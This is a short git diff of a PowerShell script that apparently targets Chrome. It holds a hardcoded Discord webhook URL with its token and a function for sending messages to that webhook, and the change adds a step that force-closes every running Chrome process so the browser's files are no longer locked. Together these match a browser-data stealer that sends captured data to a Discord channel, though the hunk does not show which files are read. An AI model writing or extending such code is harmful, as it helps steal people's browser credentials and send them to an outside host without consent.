@@ -12,6 +12,16 @@ $webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ
 # Clear the debug log at the start of the script
 Clear-Content -Path $logFile -Force
 
+# Force close Chrome to ensure files aren't in use
+$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
+if ($chromeProcesses) {
+    # Attempt to gracefully stop Chrome processes
+    Stop-Process -Name "chrome" -Force
+    Add-Content -Path $logFile -Value "Force closed Chrome to ensure files aren't in use."
+} else {
+    Add-Content -Path $logFile -Value "No Chrome processes found to close."
+}
+
 # Function to send messages to Discord
 function Send-DiscordMessage {
     param ([string]$message)
